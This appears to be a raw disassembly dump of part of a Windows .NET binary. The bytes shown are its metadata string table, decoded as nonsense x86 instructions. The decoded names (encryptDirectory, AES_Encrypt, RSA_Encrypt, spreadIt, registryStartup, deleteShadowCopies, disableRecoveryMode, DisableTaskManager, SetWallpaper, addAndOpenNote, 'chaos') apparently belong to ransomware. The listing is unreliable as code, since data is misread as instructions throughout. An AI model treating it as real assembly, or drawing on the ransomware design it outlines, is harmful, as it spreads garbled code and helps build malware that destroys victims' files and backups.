  404cb4:	6d                   	insl   (%dx),%es:(%edi)
  404cb5:	53                   	push   %ebx
  404cb6:	74 72                	je     0x404d2a
  404cb8:	69 6e 67 46 6f 72 45 	imul   $0x45726f46,0x67(%esi),%ebp
  404cbf:	78 74                	js     0x404d35
  404cc1:	65 6e                	outsb  %gs:(%esi),(%dx)
  404cc3:	73 69                	jae    0x404d2e
  404cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc6:	6e                   	outsb  %ds:(%esi),(%dx)
  404cc7:	00 42 61             	add    %al,0x61(%edx)
  404cca:	73 65                	jae    0x404d31
  404ccc:	36 34 45             	ss xor $0x45,%al
  404ccf:	6e                   	outsb  %ds:(%esi),(%dx)
  404cd0:	63 6f 64             	arpl   %ebp,0x64(%edi)
  404cd3:	65 53                	gs push %ebx
  404cd5:	74 72                	je     0x404d49
  404cd7:	69 6e 67 00 65 6e 63 	imul   $0x636e6500,0x67(%esi),%ebp
  404cde:	72 79                	jb     0x404d59
  404ce0:	70 74                	jo     0x404d56
  404ce2:	44                   	inc    %esp
  404ce3:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404cea:	79 00                	jns    0x404cec
  404cec:	63 68 65             	arpl   %ebp,0x65(%eax)
  404cef:	63 6b 44             	arpl   %ebp,0x44(%ebx)
  404cf2:	69 72 43 6f 6e 74 61 	imul   $0x61746e6f,0x43(%edx),%esi
  404cf9:	69 6e 73 00 72 73 61 	imul   $0x61737200,0x73(%esi),%ebp
  404d00:	4b                   	dec    %ebx
  404d01:	65 79 00             	gs jns 0x404d04
  404d04:	43                   	inc    %ebx
  404d05:	72 65                	jb     0x404d6c
  404d07:	61                   	popa
  404d08:	74 65                	je     0x404d6f
  404d0a:	50                   	push   %eax
  404d0b:	61                   	popa
  404d0c:	73 73                	jae    0x404d81
  404d0e:	77 6f                	ja     0x404d7f
  404d10:	72 64                	jb     0x404d76
  404d12:	00 41 45             	add    %al,0x45(%ecx)
  404d15:	53                   	push   %ebx
  404d16:	5f                   	pop    %edi
  404d17:	45                   	inc    %ebp
  404d18:	6e                   	outsb  %ds:(%esi),(%dx)
  404d19:	63 72 79             	arpl   %esi,0x79(%edx)
  404d1c:	70 74                	jo     0x404d92
  404d1e:	00 41 45             	add    %al,0x45(%ecx)
  404d21:	53                   	push   %ebx
  404d22:	5f                   	pop    %edi
  404d23:	45                   	inc    %ebp
  404d24:	6e                   	outsb  %ds:(%esi),(%dx)
  404d25:	63 72 79             	arpl   %esi,0x79(%edx)
  404d28:	70 74                	jo     0x404d9e
  404d2a:	5f                   	pop    %edi
  404d2b:	53                   	push   %ebx
  404d2c:	6d                   	insl   (%dx),%es:(%edi)
  404d2d:	61                   	popa
  404d2e:	6c                   	insb   (%dx),%es:(%edi)
  404d2f:	6c                   	insb   (%dx),%es:(%edi)
  404d30:	00 41 45             	add    %al,0x45(%ecx)
  404d33:	53                   	push   %ebx
  404d34:	5f                   	pop    %edi
  404d35:	45                   	inc    %ebp
  404d36:	6e                   	outsb  %ds:(%esi),(%dx)
  404d37:	63 72 79             	arpl   %esi,0x79(%edx)
  404d3a:	70 74                	jo     0x404db0
  404d3c:	5f                   	pop    %edi
  404d3d:	4c                   	dec    %esp
  404d3e:	61                   	popa
  404d3f:	72 67                	jb     0x404da8
  404d41:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  404d45:	6e                   	outsb  %ds:(%esi),(%dx)
  404d46:	65 72 61             	gs jb  0x404daa
  404d49:	74 65                	je     0x404db0
  404d4b:	52                   	push   %edx
  404d4c:	61                   	popa
  404d4d:	6e                   	outsb  %ds:(%esi),(%dx)
  404d4e:	64 6f                	outsl  %fs:(%esi),(%dx)
  404d50:	6d                   	insl   (%dx),%es:(%edi)
  404d51:	53                   	push   %ebx
  404d52:	61                   	popa
  404d53:	6c                   	insb   (%dx),%es:(%edi)
  404d54:	74 00                	je     0x404d56
  404d56:	52                   	push   %edx
  404d57:	53                   	push   %ebx
  404d58:	41                   	inc    %ecx
  404d59:	5f                   	pop    %edi
  404d5a:	45                   	inc    %ebp
  404d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  404d5c:	63 72 79             	arpl   %esi,0x79(%edx)
  404d5f:	70 74                	jo     0x404dd5
  404d61:	00 6c 6f 6f          	add    %ch,0x6f(%edi,%ebp,2)
  404d65:	6b 46 6f 72          	imul   $0x72,0x6f(%esi),%eax
  404d69:	44                   	inc    %esp
  404d6a:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404d71:	69 65 73 00 63 6f 70 	imul   $0x706f6300,0x73(%ebp),%esp
  404d78:	79 52                	jns    0x404dcc
  404d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d7b:	61                   	popa
  404d7c:	6d                   	insl   (%dx),%es:(%edi)
  404d7d:	69 6e 67 00 63 6f 70 	imul   $0x706f6300,0x67(%esi),%ebp
  404d84:	79 52                	jns    0x404dd8
  404d86:	65 73 69             	gs jae 0x404df2
  404d89:	73 74                	jae    0x404dff
  404d8b:	46                   	inc    %esi
  404d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d8d:	72 41                	jb     0x404dd0
  404d8f:	64 6d                	fs insl (%dx),%es:(%edi)
  404d91:	69 6e 00 61 64 64 4c 	imul   $0x4c646461,0x0(%esi),%ebp
  404d98:	69 6e 6b 54 6f 53 74 	imul   $0x74536f54,0x6b(%esi),%ebp
  404d9f:	61                   	popa
  404da0:	72 74                	jb     0x404e16
  404da2:	75 70                	jne    0x404e14
  404da4:	00 61 64             	add    %ah,0x64(%ecx)
  404da7:	64 41                	fs inc %ecx
  404da9:	6e                   	outsb  %ds:(%esi),(%dx)
  404daa:	64 4f                	fs dec %edi
  404dac:	70 65                	jo     0x404e13
  404dae:	6e                   	outsb  %ds:(%esi),(%dx)
  404daf:	4e                   	dec    %esi
  404db0:	6f                   	outsl  %ds:(%esi),(%dx)
  404db1:	74 65                	je     0x404e18
  404db3:	00 69 73             	add    %ch,0x73(%ecx)
  404db6:	4f                   	dec    %edi
  404db7:	76 65                	jbe    0x404e1e
  404db9:	72 00                	jb     0x404dbb
  404dbb:	72 65                	jb     0x404e22
  404dbd:	67 69 73 74 72 79 53 	imul   $0x74537972,0x74(%bp,%di),%esi
  404dc4:	74 
  404dc5:	61                   	popa
  404dc6:	72 74                	jb     0x404e3c
  404dc8:	75 70                	jne    0x404e3a
  404dca:	00 73 70             	add    %dh,0x70(%ebx)
  404dcd:	72 65                	jb     0x404e34
  404dcf:	61                   	popa
  404dd0:	64 49                	fs dec %ecx
  404dd2:	74 00                	je     0x404dd4
  404dd4:	72 75                	jb     0x404e4b
  404dd6:	6e                   	outsb  %ds:(%esi),(%dx)
  404dd7:	43                   	inc    %ebx
  404dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  404dd9:	6d                   	insl   (%dx),%es:(%edi)
  404dda:	6d                   	insl   (%dx),%es:(%edi)
  404ddb:	61                   	popa
  404ddc:	6e                   	outsb  %ds:(%esi),(%dx)
  404ddd:	64 00 64 65 6c       	add    %ah,%fs:0x6c(%ebp,%eiz,2)
  404de2:	65 74 65             	gs je  0x404e4a
  404de5:	53                   	push   %ebx
  404de6:	68 61 64 6f 77       	push   $0x776f6461
  404deb:	43                   	inc    %ebx
  404dec:	6f                   	outsl  %ds:(%esi),(%dx)
  404ded:	70 69                	jo     0x404e58
  404def:	65 73 00             	gs jae 0x404df2
  404df2:	64 69 73 61 62 6c 65 	imul   $0x52656c62,%fs:0x61(%ebx),%esi
  404df9:	52 
  404dfa:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  404dfe:	65 72 79             	gs jb  0x404e7a
  404e01:	4d                   	dec    %ebp
  404e02:	6f                   	outsl  %ds:(%esi),(%dx)
  404e03:	64 65 00 64 65 6c    	fs add %ah,%gs:0x6c(%ebp,%eiz,2)
  404e09:	65 74 65             	gs je  0x404e71
  404e0c:	42                   	inc    %edx
  404e0d:	61                   	popa
  404e0e:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  404e11:	70 43                	jo     0x404e56
  404e13:	61                   	popa
  404e14:	74 61                	je     0x404e77
  404e16:	6c                   	insb   (%dx),%es:(%edi)
  404e17:	6f                   	outsl  %ds:(%esi),(%dx)
  404e18:	67 00 44 69          	add    %al,0x69(%si)
  404e1c:	73 61                	jae    0x404e7f
  404e1e:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  404e22:	61                   	popa
  404e23:	73 6b                	jae    0x404e90
  404e25:	4d                   	dec    %ebp
  404e26:	61                   	popa
  404e27:	6e                   	outsb  %ds:(%esi),(%dx)
  404e28:	61                   	popa
  404e29:	67 65 72 00          	addr16 gs jb 0x404e2d
  404e2d:	53                   	push   %ebx
  404e2e:	65 74 57             	gs je  0x404e88
  404e31:	61                   	popa
  404e32:	6c                   	insb   (%dx),%es:(%edi)
  404e33:	6c                   	insb   (%dx),%es:(%edi)
  404e34:	70 61                	jo     0x404e97
  404e36:	70 65                	jo     0x404e9d
  404e38:	72 00                	jb     0x404e3a
  404e3a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  404e3f:	00 63 6c             	add    %ah,0x6c(%ebx)
  404e42:	70 00                	jo     0x404e44
  404e44:	41                   	inc    %ecx
  404e45:	64 64 43             	fs fs inc %ebx
  404e48:	6c                   	insb   (%dx),%es:(%edi)
  404e49:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  404e50:	46                   	inc    %esi
  404e51:	6f                   	outsl  %ds:(%esi),(%dx)
  404e52:	72 6d                	jb     0x404ec1
  404e54:	61                   	popa
  404e55:	74 4c                	je     0x404ea3
  404e57:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  404e5e:	00 53 65             	add    %dl,0x65(%ebx)
  404e61:	74 50                	je     0x404eb3
  404e63:	61                   	popa
  404e64:	72 65                	jb     0x404ecb
  404e66:	6e                   	outsb  %ds:(%esi),(%dx)
  404e67:	74 00                	je     0x404e69
  404e69:	69 6e 74 70 72 65 63 	imul   $0x63657270,0x74(%esi),%ebp
  404e70:	6c                   	insb   (%dx),%es:(%edi)
  404e71:	70 00                	jo     0x404e73
  404e73:	63 75 72             	arpl   %esi,0x72(%ebp)
  404e76:	72 65                	jb     0x404edd
  404e78:	6e                   	outsb  %ds:(%esi),(%dx)
  404e79:	74 43                	je     0x404ebe
  404e7b:	6c                   	insb   (%dx),%es:(%edi)
  404e7c:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  404e83:	00 52 65             	add    %dl,0x65(%edx)
  404e86:	67 65 78 52          	addr16 gs js 0x404edc
  404e8a:	65 73 75             	gs jae 0x404f02
  404e8d:	6c                   	insb   (%dx),%es:(%edi)
  404e8e:	74 00                	je     0x404e90
  404e90:	4d                   	dec    %ebp
  404e91:	65 73 73             	gs jae 0x404f07
  404e94:	61                   	popa
  404e95:	67 65 00 57 6e       	add    %dl,%gs:0x6e(%bx)
  404e9a:	64 50                	fs push %eax
  404e9c:	72 6f                	jb     0x404f0d
  404e9e:	63 00                	arpl   %eax,(%eax)
  404ea0:	43                   	inc    %ebx
  404ea1:	72 65                	jb     0x404f08
  404ea3:	61                   	popa
  404ea4:	74 65                	je     0x404f0b
  404ea6:	50                   	push   %eax
  404ea7:	61                   	popa
  404ea8:	72 61                	jb     0x404f0b
  404eaa:	6d                   	insl   (%dx),%es:(%edi)
  404eab:	73 00                	jae    0x404ead
  404ead:	67 65 74 5f          	addr16 gs je 0x404f10
  404eb1:	43                   	inc    %ebx
  404eb2:	72 65                	jb     0x404f19
  404eb4:	61                   	popa
  404eb5:	74 65                	je     0x404f1c
  404eb7:	50                   	push   %eax
  404eb8:	61                   	popa
  404eb9:	72 61                	jb     0x404f1c
  404ebb:	6d                   	insl   (%dx),%es:(%edi)
  404ebc:	73 00                	jae    0x404ebe
  404ebe:	47                   	inc    %edi
  404ebf:	65 74 54             	gs je  0x404f16
  404ec2:	65 78 74             	gs js  0x404f39
  404ec5:	00 53 65             	add    %dl,0x65(%ebx)
  404ec8:	74 54                	je     0x404f1e
  404eca:	65 78 74             	gs js  0x404f41
  404ecd:	00 61 63             	add    %ah,0x63(%ecx)
  404ed0:	74 69                	je     0x404f3b
  404ed2:	6f                   	outsl  %ds:(%esi),(%dx)
  404ed3:	6e                   	outsb  %ds:(%esi),(%dx)
  404ed4:	00 75 50             	add    %dh,0x50(%ebp)
  404ed7:	61                   	popa
  404ed8:	72 61                	jb     0x404f3b
  404eda:	6d                   	insl   (%dx),%es:(%edi)
  404edb:	00 76 50             	add    %dh,0x50(%esi)
  404ede:	61                   	popa
  404edf:	72 61                	jb     0x404f42
  404ee1:	6d                   	insl   (%dx),%es:(%edi)
  404ee2:	00 77 69             	add    %dh,0x69(%edi)
  404ee5:	6e                   	outsb  %ds:(%esi),(%dx)
  404ee6:	49                   	dec    %ecx
  404ee7:	6e                   	outsb  %ds:(%esi),(%dx)
  404ee8:	69 00 61 72 67 73    	imul   $0x73677261,(%eax),%eax
  404eee:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  404ef2:	67 74 68             	addr16 je 0x404f5d
  404ef5:	00 70 6c             	add    %dh,0x6c(%eax)
  404ef8:	61                   	popa
  404ef9:	69 6e 54 65 78 74 00 	imul   $0x747865,0x54(%esi),%ebp
  404f00:	6c                   	insb   (%dx),%es:(%edi)
  404f01:	6f                   	outsl  %ds:(%esi),(%dx)
  404f02:	63 61 74             	arpl   %esp,0x74(%ecx)
  404f05:	69 6f 6e 00 64 69 72 	imul   $0x72696400,0x6e(%edi),%ebp
  404f0c:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  404f11:	79 00                	jns    0x404f13
  404f13:	69 6e 70 75 74 46 69 	imul   $0x69467475,0x70(%esi),%ebp
  404f1a:	6c                   	insb   (%dx),%es:(%edi)
  404f1b:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  404f1f:	73 73                	jae    0x404f94
  404f21:	77 6f                	ja     0x404f92
  404f23:	72 64                	jb     0x404f89
  404f25:	00 6b 65             	add    %ch,0x65(%ebx)
  404f28:	79 52                	jns    0x404f7c
  404f2a:	53                   	push   %ebx
  404f2b:	41                   	inc    %ecx
  404f2c:	00 70 61             	add    %dh,0x61(%eax)
  404f2f:	73 73                	jae    0x404fa4
  404f31:	77 6f                	ja     0x404fa2
  404f33:	72 64                	jb     0x404f99
  404f35:	42                   	inc    %edx
  404f36:	79 74                	jns    0x404fac
  404f38:	65 73 00             	gs jae 0x404f3b
  404f3b:	6c                   	insb   (%dx),%es:(%edi)
  404f3c:	65 6e                	outsb  %gs:(%esi),(%dx)
  404f3e:	67 68 74 42 79 74    	addr16 push $0x74794274
  404f44:	65 73 00             	gs jae 0x404f47
  404f47:	74 65                	je     0x404fae
  404f49:	78 74                	js     0x404fbf
  404f4b:	54                   	push   %esp
  404f4c:	6f                   	outsl  %ds:(%esi),(%dx)
  404f4d:	45                   	inc    %ebp
  404f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  404f4f:	63 72 79             	arpl   %esi,0x79(%edx)
  404f52:	70 74                	jo     0x404fc8
  404f54:	00 70 75             	add    %dh,0x75(%eax)
  404f57:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  404f5b:	4b                   	dec    %ebx
  404f5c:	65 79 53             	gs jns 0x404fb2
  404f5f:	74 72                	je     0x404fd3
  404f61:	69 6e 67 00 63 6f 6d 	imul   $0x6d6f6300,0x67(%esi),%ebp
  404f68:	6d                   	insl   (%dx),%es:(%edi)
  404f69:	61                   	popa
  404f6a:	6e                   	outsb  %ds:(%esi),(%dx)
  404f6b:	64 73 00             	fs jae 0x404f6e
  404f6e:	62 61 73             	bound  %esp,0x73(%ecx)
  404f71:	65 36 34 00          	gs ss xor $0x0,%al
  404f75:	53                   	push   %ebx
  404f76:	79 73                	jns    0x404feb
  404f78:	74 65                	je     0x404fdf
  404f7a:	6d                   	insl   (%dx),%es:(%edi)
  404f7b:	2e 52                	cs push %edx
  404f7d:	75 6e                	jne    0x404fed
  404f7f:	74 69                	je     0x404fea
  404f81:	6d                   	insl   (%dx),%es:(%edi)
  404f82:	65 2e 49             	gs cs dec %ecx
  404f85:	6e                   	outsb  %ds:(%esi),(%dx)
  404f86:	74 65                	je     0x404fed
  404f88:	72 6f                	jb     0x404ff9
  404f8a:	70 53                	jo     0x404fdf
  404f8c:	65 72 76             	gs jb  0x405005
  404f8f:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  404f96:	72 73                	jb     0x40500b
  404f98:	68 61 6c 41 73       	push   $0x73416c61
  404f9d:	41                   	inc    %ecx
  404f9e:	74 74                	je     0x405014
  404fa0:	72 69                	jb     0x40500b
  404fa2:	62 75 74             	bound  %esi,0x74(%ebp)
  404fa5:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  404fa9:	6d                   	insl   (%dx),%es:(%edi)
  404faa:	61                   	popa
  404fab:	6e                   	outsb  %ds:(%esi),(%dx)
  404fac:	61                   	popa
  404fad:	67 65 64 54          	addr16 gs fs push %esp
  404fb1:	79 70                	jns    0x405023
  404fb3:	65 00 68 77          	add    %ch,%gs:0x77(%eax)
  404fb7:	6e                   	outsb  %ds:(%esi),(%dx)
  404fb8:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  404fbc:	6e                   	outsb  %ds:(%esi),(%dx)
  404fbd:	64 43                	fs inc %ebx
  404fbf:	68 69 6c 64 00       	push   $0x646c69
  404fc4:	68 57 6e 64 4e       	push   $0x4e646e57
  404fc9:	65 77 50             	gs ja  0x40501c
  404fcc:	61                   	popa
  404fcd:	72 65                	jb     0x405034
  404fcf:	6e                   	outsb  %ds:(%esi),(%dx)
  404fd0:	74 00                	je     0x404fd2
  404fd2:	70 61                	jo     0x405035
  404fd4:	74 74                	je     0x40504a
  404fd6:	65 72 6e             	gs jb  0x405047
  404fd9:	00 6d 00             	add    %ch,0x0(%ebp)
  404fdc:	74 78                	je     0x405056
  404fde:	74 00                	je     0x404fe0
  404fe0:	53                   	push   %ebx
  404fe1:	79 73                	jns    0x405056
  404fe3:	74 65                	je     0x40504a
  404fe5:	6d                   	insl   (%dx),%es:(%edi)
  404fe6:	2e 52                	cs push %edx
  404fe8:	75 6e                	jne    0x405058
  404fea:	74 69                	je     0x405055
  404fec:	6d                   	insl   (%dx),%es:(%edi)
  404fed:	65 2e 43             	gs cs inc %ebx
  404ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff1:	6d                   	insl   (%dx),%es:(%edi)
  404ff2:	70 69                	jo     0x40505d
  404ff4:	6c                   	insb   (%dx),%es:(%edi)
  404ff5:	65 72 53             	gs jb  0x40504b
  404ff8:	65 72 76             	gs jb  0x405071
  404ffb:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  405002:	6d                   	insl   (%dx),%es:(%edi)
  405003:	70 69                	jo     0x40506e
  405005:	6c                   	insb   (%dx),%es:(%edi)
  405006:	61                   	popa
  405007:	74 69                	je     0x405072
  405009:	6f                   	outsl  %ds:(%esi),(%dx)
  40500a:	6e                   	outsb  %ds:(%esi),(%dx)
  40500b:	52                   	push   %edx
  40500c:	65 6c                	gs insb (%dx),%es:(%edi)
  40500e:	61                   	popa
  40500f:	78 61                	js     0x405072
  405011:	74 69                	je     0x40507c
  405013:	6f                   	outsl  %ds:(%esi),(%dx)
  405014:	6e                   	outsb  %ds:(%esi),(%dx)
  405015:	73 41                	jae    0x405058
  405017:	74 74                	je     0x40508d
  405019:	72 69                	jb     0x405084
  40501b:	62 75 74             	bound  %esi,0x74(%ebp)
  40501e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405022:	6e                   	outsb  %ds:(%esi),(%dx)
  405023:	74 69                	je     0x40508e
  405025:	6d                   	insl   (%dx),%es:(%edi)
  405026:	65 43                	gs inc %ebx
  405028:	6f                   	outsl  %ds:(%esi),(%dx)
  405029:	6d                   	insl   (%dx),%es:(%edi)
  40502a:	70 61                	jo     0x40508d
  40502c:	74 69                	je     0x405097
  40502e:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  405031:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  405038:	69 
  405039:	62 75 74             	bound  %esi,0x74(%ebp)
  40503c:	65 00 63 68          	add    %ah,%gs:0x68(%ebx)
  405040:	61                   	popa
  405041:	6f                   	outsl  %ds:(%esi),(%dx)
  405042:	73 00                	jae    0x405044
  405044:	44                   	inc    %esp
  405045:	6c                   	insb   (%dx),%es:(%edi)
  405046:	6c                   	insb   (%dx),%es:(%edi)
  405047:	49                   	dec    %ecx
  405048:	6d                   	insl   (%dx),%es:(%edi)
  405049:	70 6f                	jo     0x4050ba
  40504b:	72 74                	jb     0x4050c1
  40504d:	41                   	inc    %ecx
  40504e:	74 74                	je     0x4050c4
  405050:	72 69                	jb     0x4050bb
  405052:	62 75 74             	bound  %esi,0x74(%ebp)
  405055:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  405059:	65 72 33             	gs jb  0x40508f
  40505c:	32 2e                	xor    (%esi),%ch
  40505e:	64 6c                	fs insb (%dx),%es:(%edi)
  405060:	6c                   	insb   (%dx),%es:(%edi)
  405061:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  405068:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40506b:	30 00                	xor    %al,(%eax)
  40506d:	53                   	push   %ebx
  40506e:	79 73                	jns    0x4050e3
  405070:	74 65                	je     0x4050d7
  405072:	6d                   	insl   (%dx),%es:(%edi)
  405073:	2e 54                	cs push %esp
  405075:	68 72 65 61 64       	push   $0x64616572
  40507a:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  405081:	65 61                	gs popa
  405083:	64 53                	fs push %ebx
  405085:	74 61                	je     0x4050e8
  405087:	72 74                	jb     0x4050fd
  405089:	00 43 53             	add    %al,0x53(%ebx)
  40508c:	24 3c                	and    $0x3c,%al
  40508e:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
  405092:	43                   	inc    %ebx
  405093:	61                   	popa
  405094:	63 68 65             	arpl   %ebp,0x65(%eax)
  405097:	64 41                	fs inc %ecx
  405099:	6e                   	outsb  %ds:(%esi),(%dx)
  40509a:	6f                   	outsl  %ds:(%esi),(%dx)
  40509b:	6e                   	outsb  %ds:(%esi),(%dx)
  40509c:	79 6d                	jns    0x40510b
  40509e:	6f                   	outsl  %ds:(%esi),(%dx)
  40509f:	75 73                	jne    0x405114
  4050a1:	4d                   	dec    %ebp
  4050a2:	65 74 68             	gs je  0x40510d
  4050a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4050a6:	64 44                	fs inc %esp
  4050a8:	65 6c                	gs insb (%dx),%es:(%edi)
  4050aa:	65 67 61             	gs addr16 popa
  4050ad:	74 65                	je     0x405114
  4050af:	32 00                	xor    (%eax),%al
  4050b1:	43                   	inc    %ebx
  4050b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4050b3:	6d                   	insl   (%dx),%es:(%edi)
  4050b4:	70 69                	jo     0x40511f
  4050b6:	6c                   	insb   (%dx),%es:(%edi)
  4050b7:	65 72 47             	gs jb  0x405101
  4050ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4050bc:	65 72 61             	gs jb  0x405120
  4050bf:	74 65                	je     0x405126
  4050c1:	64 41                	fs inc %ecx
  4050c3:	74 74                	je     0x405139
  4050c5:	72 69                	jb     0x405130
  4050c7:	62 75 74             	bound  %esi,0x74(%ebp)
  4050ca:	65 00 3c 4d 61 69 6e 	add    %bh,%gs:0x3e6e6961(,%ecx,2)
  4050d1:	3e 
  4050d2:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4050d5:	31 00                	xor    %eax,(%eax)
  4050d7:	43                   	inc    %ebx
  4050d8:	53                   	push   %ebx
  4050d9:	24 3c                	and    $0x3c,%al
  4050db:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
  4050df:	43                   	inc    %ebx
  4050e0:	61                   	popa
  4050e1:	63 68 65             	arpl   %ebp,0x65(%eax)
  4050e4:	64 41                	fs inc %ecx
  4050e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4050e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4050e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4050e9:	79 6d                	jns    0x405158
  4050eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4050ec:	75 73                	jne    0x405161
  4050ee:	4d                   	dec    %ebp
  4050ef:	65 74 68             	gs je  0x40515a
  4050f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4050f3:	64 44                	fs inc %esp
  4050f5:	65 6c                	gs insb (%dx),%es:(%edi)
  4050f7:	65 67 61             	gs addr16 popa
  4050fa:	74 65                	je     0x405161
  4050fc:	33 00                	xor    (%eax),%eax
  4050fe:	54                   	push   %esp
  4050ff:	68 72 65 61 64       	push   $0x64616572
  405104:	00 53 74             	add    %dl,0x74(%ebx)
  405107:	61                   	popa
  405108:	72 74                	jb     0x40517e
  40510a:	00 45 6e             	add    %al,0x6e(%ebp)
  40510d:	76 69                	jbe    0x405178
  40510f:	72 6f                	jb     0x405180
  405111:	6e                   	outsb  %ds:(%esi),(%dx)
  405112:	6d                   	insl   (%dx),%es:(%edi)
  405113:	65 6e                	outsb  %gs:(%esi),(%dx)
  405115:	74 00                	je     0x405117
  405117:	45                   	inc    %ebp
  405118:	78 69                	js     0x405183
  40511a:	74 00                	je     0x40511c
  40511c:	41                   	inc    %ecx
  40511d:	70 70                	jo     0x40518f
  40511f:	6c                   	insb   (%dx),%es:(%edi)
  405120:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  405127:	00 53 79             	add    %dl,0x79(%ebx)
  40512a:	73 74                	jae    0x4051a0
  40512c:	65 6d                	gs insl (%dx),%es:(%edi)
  40512e:	2e 52                	cs push %edx
  405130:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  405133:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405138:	6e                   	outsb  %ds:(%esi),(%dx)
  405139:	00 41 73             	add    %al,0x73(%ecx)
  40513c:	73 65                	jae    0x4051a3
  40513e:	6d                   	insl   (%dx),%es:(%edi)
  40513f:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  405143:	47                   	inc    %edi
  405144:	65 74 45             	gs je  0x40518c
  405147:	6e                   	outsb  %ds:(%esi),(%dx)
  405148:	74 72                	je     0x4051bc
  40514a:	79 41                	jns    0x40518d
  40514c:	73 73                	jae    0x4051c1
  40514e:	65 6d                	gs insl (%dx),%es:(%edi)
  405150:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  405154:	67 65 74 5f          	addr16 gs je 0x4051b7
  405158:	4c                   	dec    %esp
  405159:	6f                   	outsl  %ds:(%esi),(%dx)
  40515a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40515d:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  405164:	74 65                	je     0x4051cb
  405166:	6d                   	insl   (%dx),%es:(%edi)
  405167:	2e 49                	cs dec %ecx
  405169:	4f                   	dec    %edi
  40516a:	00 50 61             	add    %dl,0x61(%eax)
  40516d:	74 68                	je     0x4051d7
  40516f:	00 47 65             	add    %al,0x65(%edi)
  405172:	74 44                	je     0x4051b8
  405174:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40517b:	79 4e                	jns    0x4051cb
  40517d:	61                   	popa
  40517e:	6d                   	insl   (%dx),%es:(%edi)
  40517f:	65 00 53 70          	add    %dl,%gs:0x70(%ebx)
  405183:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  405187:	6c                   	insb   (%dx),%es:(%edi)
  405188:	46                   	inc    %esi
  405189:	6f                   	outsl  %ds:(%esi),(%dx)
  40518a:	6c                   	insb   (%dx),%es:(%edi)
  40518b:	64 65 72 00          	fs gs jb 0x40518f
  40518f:	47                   	inc    %edi
  405190:	65 74 46             	gs je  0x4051d9
  405193:	6f                   	outsl  %ds:(%esi),(%dx)
  405194:	6c                   	insb   (%dx),%es:(%edi)
  405195:	64 65 72 50          	fs gs jb 0x4051e9
  405199:	61                   	popa
  40519a:	74 68                	je     0x405204
  40519c:	00 53 74             	add    %dl,0x74(%ebx)
  40519f:	72 69                	jb     0x40520a
  4051a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4051a2:	67 00 6f 70          	add    %ch,0x70(%bx)
  4051a6:	5f                   	pop    %edi
  4051a7:	49                   	dec    %ecx
  4051a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4051a9:	65 71 75             	gs jno 0x405221
  4051ac:	61                   	popa
  4051ad:	6c                   	insb   (%dx),%es:(%edi)
  4051ae:	69 74 79 00 53 6c 65 	imul   $0x65656c53,0x0(%ecx,%edi,2),%esi
  4051b5:	65 
  4051b6:	70 00                	jo     0x4051b8
  4051b8:	53                   	push   %ebx
  4051b9:	79 73                	jns    0x40522e
  4051bb:	74 65                	je     0x405222
  4051bd:	6d                   	insl   (%dx),%es:(%edi)
  4051be:	2e 44                	cs inc %esp
  4051c0:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4051c7:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  4051ce:	63 65 73             	arpl   %esp,0x73(%ebp)
  4051d1:	73 00                	jae    0x4051d3
  4051d3:	47                   	inc    %edi
